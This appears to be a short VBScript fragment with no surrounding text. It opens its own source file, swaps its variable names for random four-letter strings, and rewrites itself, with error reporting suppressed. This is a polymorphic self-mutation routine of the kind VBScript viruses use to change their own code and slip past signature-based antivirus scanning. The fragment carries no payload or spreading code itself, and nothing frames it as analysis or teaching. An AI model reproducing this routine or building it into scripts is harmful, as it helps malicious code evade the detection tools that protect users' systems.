Randomize
On Error Resume Next
Set Of = CreateObject("Scripting.FileSystemObject")
vC = Of.OpenTextFile(WScript.ScriptFullName, 1).Readall
fS = Array("Of", "vC", "fS", "fSC")
For fSC = 0 To 3
vC = Replace(vC, fS(fSC), Chr((Int(Rnd * 22) + 65)) & Chr((Int(Rnd * 22) + 65)) & Chr((Int(Rnd * 22) + 65)) & Chr((Int(Rnd * 22) + 65)))
Next
Of.OpenTextFile(WScript.ScriptFullName, 2, 1).Writeline vC